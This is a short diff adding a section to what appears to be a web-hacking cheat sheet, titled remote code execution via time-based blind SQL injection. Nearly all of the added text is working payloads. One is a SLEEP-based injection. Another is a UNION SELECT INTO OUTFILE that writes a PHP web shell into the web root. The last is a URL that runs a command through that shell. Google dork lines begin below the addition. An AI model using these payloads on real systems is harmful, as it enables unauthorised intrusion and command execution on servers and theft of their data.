@@ -29,6 +29,20 @@ query as an HTTP GET parameter.
 http://www.target.com/index.php?sql_query=SELECT * FROM customers
 ------------------------------------------------------------------------------------------------------
 
+# Remote code execution via time based blind SQLi
+
+https://www.youtube.com/watch?v=JZR8bDRl0t8
+
+- The 'title' parameter is vulnerable.
+http://target.com/item.php?title='%2b(SELECT+1+FROM+(SELECT+SLEEP(10))A)%2b'&action=search
+
+- Inject a PHP shell: a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/shell.php" -- -
+http://target.com/item.php?title=a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/shell.php" -- -&action=search
+
+- Run a command.
+http://target.com/shell.php?cmd=id
+------------------------------------------------------------------------------------------------------
+
 # Google Dorks
 
 inurl:index.php?id=
